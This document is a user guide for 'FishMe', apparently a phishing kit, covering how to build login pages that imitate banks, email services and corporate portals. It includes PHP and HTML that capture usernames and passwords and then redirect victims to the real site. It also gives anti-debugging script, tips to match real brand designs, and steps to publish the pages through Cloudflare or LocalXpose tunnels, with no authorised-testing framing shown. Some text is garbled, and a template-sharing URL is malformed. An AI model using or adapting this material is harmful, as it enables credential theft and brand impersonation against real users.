# Template Creation Guide

This guide provides detailed instructions for creating custom phishing templates using FishMe.

## Table of Contents

- [Overview](#overview)
- [Creating Templates with Command](#creating-templates-with-command)
- [Template Structure](#template-structure)
- [Editing Templates](#editing-templates)
- [What to Remove](#what-to-remove)
- [What NOT to Remove](#what-not-to-remove)
- [Template Customization](#template-customization)
- [Testing Templates](#testing-templates)
- [Best Practices](#best-practices)

## Overview

FishMe provides two ways to create templates:
1. **Interactive Wizard** - Using `fishme generate` command
2. **Manual Creation** - Creating files manually

This guide focuses on the interactive wizard method.

## Creating Templates with Command

### Step 1: Run the Template Generator

```bash
fishme generate
```

This starts an interactive wizard that guides you through template creation.

### Step 2: Provide Template Information

The wizard will ask for the following information:

#### Template Name (Slug)
- **What it is**: Internal identifier for the template
- **Format**: lowercase, alphanumeric, underscores only
- **Example**: `my_custom_site`, `bank_login`, `corporate_portal`
- **Important**: This becomes the directory name

#### Display Name
- **What it is**: Human-readable name shown in UI
- **Format**: Any text, spaces allowed
- **Example**: `My Custom Site`, `Bank Login`, `Corporate Portal`

#### Brand Name
- **What it is**: The brand being simulated
- **Format**: Brand name
- **Example**: `MyCompany`, `BankName`, `Corporate`

#### Target Domain
- **What it is**: The legitimate domain to redirect to
- **Format**: domain.com
- **Example**: `example.com`, `mybank.com`, `corporate.com`

#### Style Selection
- **Options**: modern, corporate, dark
- **Modern**: Gradient backgrounds, rounded corners, modern UI
- **Corporate**: Clean, professional, business-focused
- **Dark**: Dark theme, modern aesthetic

#### Primary Color
- **What it is**: Main accent color for the template
- **Format**: Hex color code
- **Example**: `#007bff`, `#28a745`, `#dc3545`
- **Default**: `#007bff` (blue)

#### Logo URL (Optional)
- **What it is**: URL to logo image
- **Format**: Full URL
- **Example**: `https://example.com/logo.png`
- **Skip**: Press Enter to skip

#### Redirect URL
- **What it is**: Where to redirect after login
- **Format**: Full URL
- **Example**: `https://example.com/login`
- **Default**: `https://example.com`

### Step 3: Template Created

After completing the wizard, FishMe creates:
- Template directory: `templates/<template_name>/`
- All necessary files
- Configuration file

## Template Structure

After creation, your template will have this structure:

```
templates/<template_name>/
├── site.json          # Template metadata (DO NOT DELETE)
├── index.php          # Entry point (DO NOT DELETE)
├── login.html         # Login page (EDIT THIS)
├── login.php          # Login handler (EDIT WITH CARE)
└── style.css          # Stylesheet (EDIT THIS)
```

## Editing Templates

### Editing login.html

This is the main login page that users see.

#### What to Edit:

1. **Page Title**
```html
<title>My Custom Site - Login</title>
```

2. **Logo**
```html
<div class="logo">
    <img src="https://example.com/logo.png" alt="Brand Name">
</div>
```

3. **Form Fields**
```html
<input type="text" name="username" placeholder="Username or Email" required>
<input type="password" name="password" placeholder="Password" required>
```

4. **Button Text**
```html
<button type="submit">Sign In</button>
```

5. **Additional Links**
```html
<a href="#">Forgot Password?</a>
<a href="#">Create Account</a>
```

#### What NOT to Edit:

- **Form action**: Keep as `action="login.php"`
- **Form method**: Keep as `method="POST"`
- **Input names**: Keep `name="username"` and `name="password"`
- **CSS classes**: Keep existing class names for styling

### Editing login.php

This handles form submission and credential capture.

#### What to Edit:

1. **Redirect URL**
```php
header('Location: https://example.com/login');
```

2. **Additional Processing** (advanced)
```php
// Add custom validation
if (empty($username)) {
    // Handle error
}
```

#### What NOT to Edit:

- **include '../../config.php'** - Required for sanitization
- **sanitizeInput()** calls - Required for security
- **saveCapture()** call - Required for data capture
- **POST field names** - Keep `$_POST['username']` and `$_POST['password']`

### Editing style.css

This contains the template styling.

#### What to Edit:

1. **Colors**
```css
background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
```

2. **Fonts**
```css
font-family: 'Your Font', sans-serif;
```

3. **Spacing**
```css
padding: 40px;
margin: 20px;
```

4. **Border Radius**
```css
border-radius: 12px;
```

#### What NOT to Edit:

- **Basic structure** - Keep the overall layout
- **Responsive classes** - Keep mobile-friendly classes
- **Form styling** - Keep form input styles

### Editing site.json

This contains template metadata.

#### What to Edit:

1. **Display Name**
```json
"name": "My Custom Site"
```

2. **Description**
```json
"description": "Custom phishing template"
```

3. **Category**
```json
"category": "other"
```

#### What NOT to Edit:

- **slug** - This is the directory name
- **allocated_url** - Auto-generated
- **entry** - Should remain "login.html"

## What to Remove

### Safe to Remove:

1. **Placeholder Text**
```html
<!-- Remove placeholder comments -->
<!-- TODO: Add logo -->
```

2. **Unused CSS Classes**
```css
/* Remove unused classes */
.unused-class {
    /* ... */
}
```

3. **Example Content**
```html
<!-- Remove example links -->
<a href="#">Example Link</a>
```

4. **Debug Code**
```php
// Remove debug statements
echo "Debug: " . $username;
```

### What to Remove with Caution:

1. **JavaScript** - Only if not needed for functionality
2. **Additional CSS Files** - If you're using inline styles instead
3. **Redirect Logic** - Only if you're implementing custom redirect

## What NOT to Remove

### Never Remove:

1. **site.json** - Required for template metadata
2. **index.php** - Required entry point
3. **login.html** - Required login page
4. **login.php** - Required credential capture
5. **include '../../config.php'** - Required for security
6. **sanitizeInput()** - Required for input sanitization
7. **saveCapture()** - Required for data capture
8. **Form action="login.php"** - Required for form submission
9. **POST field names** - Required for data capture

### Keep Intact:

1. **Form Structure**
```html
<form action="login.php" method="POST">
    <!-- Keep this structure -->
</form>
```

2. **Input Names**
```html
<input name="username">
<input name="password">
```

3. **PHP Include**
```php
<?php require_once '../../config.php'; ?>
```

## Template Customization

### Adding Custom Fields

To add custom fields to the capture:

1. **Add to login.html**
```html
<input type="text" name="custom_field" placeholder="Custom Field">
```

2. **Add to login.php**
```php
$custom_field = sanitizeInput($_POST['custom_field'] ?? '');
$capture['custom_field'] = $custom_field;
```

### Adding JavaScript

Add custom JavaScript for enhanced functionality:

```html
<script>
// Custom validation
function validateForm() {
    const username = document.querySelector('input[name="username"]').value;
    if (username.length < 3) {
        alert('Username must be at least 3 characters');
        return false;
    }
    return true;
}
</script>
```

### Adding Anti-Debugging

Add anti-debugging measures (optional):

```html
<script>
// Disable right-click
document.addEventListener('contextmenu', event => event.preventDefault());

// Disable F12
document.addEventListener('keydown', function(e) {
    if (e.key === 'F12') {
        e.preventDefault();
    }
});
</script>
```

### Custom Redirect Logic

Implement custom redirect logic:

```php
// In login.php
if (strpos($username, '@') !== false) {
    // Email format, redirect to email login
    header('Location: https://example.com/email-login');
} else {
    // Username format, redirect to standard login
    header('Location: https://example.com/login');
}
```

## Testing Templates

### Validate Template Structure

```bash
fishme template validate <template_name>
```

This checks:
- Required files exist
- site.json is valid JSON
- Template structure is correct

### Test Template Locally

1. Start FishMe server:
```bash
fishme start
```

2. Select your template
3. Use default port (8080)
4. Skip tunnel for testing
5. Open browser to: `http://127.0.0.1:8080/templates/<template_name>/`

### Test Credential Capture

1. Enter test credentials
2. Submit the form
3. Check capture file:
```bash
cat capture/<template_name>.json
```

### Test Redirect

1. Verify redirect goes to correct URL
2. Check if credentials are passed (if intended)
3. Verify legitimate site loads

### Test with Tunnel (Optional)

1. Start with tunnel:
```bash
fishme start
# Select Cloudflare or LocalXpose
```

2. Test via tunnel URL
3. Verify capture still works

## Best Practices

### Security

1. **Always sanitize input**
```php
$username = sanitizeInput($_POST['username']);
```

2. **Validate URLs**
```bash
fishme config set security.validate_urls true
```

3. **Use HTTPS redirects**
```php
header('Location: https://example.com');
```

### Design

1. **Keep it realistic**
   - Use actual brand colors
   - Match legitimate site layout
   - Use proper fonts

2. **Mobile responsive**
   - Test on mobile devices
   - Use responsive CSS
   - Ensure form is usable on mobile

3. **Accessibility**
   - Use proper labels
   - Include alt text for images
   - Ensure keyboard navigation works

### Code Quality

1. **Comment your code**
```php
// Capture custom field
$custom_field = sanitizeInput($_POST['custom_field']);
```

2. **Use meaningful variable names**
```php
$user_email = sanitizeInput($_POST['username']);
```

3. **Follow coding standards**
   - 4 spaces for indentation
   - Consistent naming
   - Proper error handling

### Template Value

1. **Add useful elements**
   - Explain what was captured
   - Show phishing tips
   - Provide resources

2. **Document purpose**
   - Explain in site.json
   - Add comments in code
   - Include README in template directory

## Common Mistakes

### Mistake 1: Removing Required Files

**Problem**: Deleting site.json or index.php

**Solution**: Never remove these files. They are required for template to work.

### Mistake 2: Changing Input Names

**Problem**: Changing `name="username"` to something else

**Solution**: Keep input names as `username` and `password` for compatibility.

### Mistake 3: Removing Sanitization

**Problem**: Removing `sanitizeInput()` calls

**Solution**: Always sanitize input for security.

### Mistake 4: Hardcoding Redirects

**Problem**: Hardcoding redirect URL without configuration

**Solution**: Use site.json or config for redirect URLs.

### Mistake 5: Not Testing

**Problem**: Creating template without testing

**Solution**: Always test template before using in s.

## Advanced Topics

### Cloning Existing Templates

Clone an existing template as a starting point:

```bash
fishme template clone facebook my_facebook
```

Then edit the cloned template.

### Template Backup

Backup your custom template:

```bash
fishme template backup <template_name>
```

### Template Export

Export template for sharing:

```bash
fishme template export <template_name> /path/to/export
```

### Template Import

Import template from archive:

```bash
fishme template import /path/to/archive.tar.gz
```

## Sharing Your Templates

We encourage you to share your custom templates with the community to help improve FishMe.

### How to Share Templates

If you create a login page or template, please share it with us at:

**https://fishme/cust/temp.orildo.sbs**

Sharing your templates helps us:
- Improve the tool with more diverse templates
- Fix bugs and issues
- Add new features based on real-world use cases
- Provide better phishing capabilities

### Template Submission Process

1. **Export Your Template**
```bash
fishme template export <template_name>
```

2. **Prepare for Submission**
- Ensure template is validated: `fishme template validate <name>`
- Test template thoroughly
- Add description in site.json
- Remove any sensitive data

3. **Submit to Templates Portal**
- Visit: https://fishme/cust/temp.orildo.sbs
- Upload your exported template
- Provide description and category
- Include screenshots (optional)
- Add your attribution (optional)

### Template Guidelines for Submission

- **Phishing Purpose**: Templates must be for  phishing use only
- **No Malicious Code**: Do not include malicious scripts or backdoors
- **Proper Attribution**: Credit original sources if cloning existing templates
- **Quality Standards**: Templates should be well-designed and functional
- **Documentation**: Include clear description of the template's purpose
- **Testing**: Ensure template works correctly before submission

### Template Review Process

Submitted templates go through:
1. **Validation Check**: Structure and syntax validation
2. **Security Review**: Check for malicious code or vulnerabilities
3. **Quality Assessment**: Design and functionality review
4. **Testing**: Functional testing in various environments
5. **Approval**: Approved templates are added to the repository

### Benefits of Sharing

- **Community Contribution**: Help other users with diverse templates
- **Tool Improvement**: Help us identify and fix issues
- **Feature Requests**: Suggest new features based on your needs
- **Recognition**: Get credited for your contributions
- **Early Access**: Get early access to new features

### Template Repository

Shared templates are available at:
- **Portal**: https://fishme/cust/temp.orildo.sbs

### Downloading Community Templates

To download templates shared by the community:

1. Visit https://fishme/cust/temp.orildo.sbs
2. Browse available templates
3. Download template archive
4. Import into FishMe:
```bash
fishme template import /path/to/template.tar.gz
```

## Support

For template creation issues:

1. Check validation: `fishme template validate <name>`
2. Review logs: `fishme log recent 50`
3. Check structure: `ls -la templates/<name>/`
4. Report issues: GitHub Issues

For template sharing:
- Submit templates: https://fishme/cust/temp.orildo.sbs
- Template issues: GitHub Issues
- General questions: GitHub Discussions

## Examples

### Simple Email Login Template

```bash
fishme generate
# Template name: email_login
# Display name: Email Login
# Brand: EmailService
# Domain: emailservice.com
# Style: modern
# Primary color: #007bff
# Logo: (skip)
# Redirect: https://emailservice.com/login
```

### Corporate Portal Template

```bash
fishme generate
# Template name: corporate_portal
# Display name: Corporate Portal
# Brand: MyCompany
# Domain: mycompany.com
# Style: corporate
# Primary color: #28a745
# Logo: https://mycompany.com/logo.png
# Redirect: https://mycompany.com/portal
```

### Banking Template

```bash
fishme generate
# Template name: bank_login
# Display name: Bank Login
# Brand: MyBank
# Domain: mybank.com
# Style: corporate
# Primary color: #004085
# Logo: https://mybank.com/logo.png
# Redirect: https://mybank.com/online-banking
```

---

**Last Updated**: 2026-06-13
